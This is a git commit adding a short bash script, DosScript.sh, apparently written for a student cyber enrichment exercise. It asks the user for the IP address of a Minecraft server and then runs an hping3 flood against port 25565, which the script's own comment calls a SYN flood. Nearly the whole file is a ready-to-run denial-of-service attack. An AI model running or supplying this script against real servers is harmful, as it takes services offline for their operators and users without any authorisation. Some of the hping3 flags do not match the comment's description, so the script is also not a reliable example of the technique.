a415d1cdb3d4bb775254680d4436cef11adb38be
KeelanBaines <33299821+KeelanBaines@users.noreply.github.com>
2017-11-06 22:20:16 +0000

    DosScript.sh

---
+++ DosScript.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+#DosScript
+echo "UTC Cyber enruchment DoS Script - Developed by Keelan Baines"
+echo -e "Enter the IPv4 address of the MC server you found earlier: " #waits for user input
+read ip #stores IP entered under variable $ip
+echo "Server IP: $ip" #prints IP entered by user
+
+sudo hping3 -C 10000 -d 120 -s -w 64 -p 25565 --flood $ip #Floods the host with SYN packets
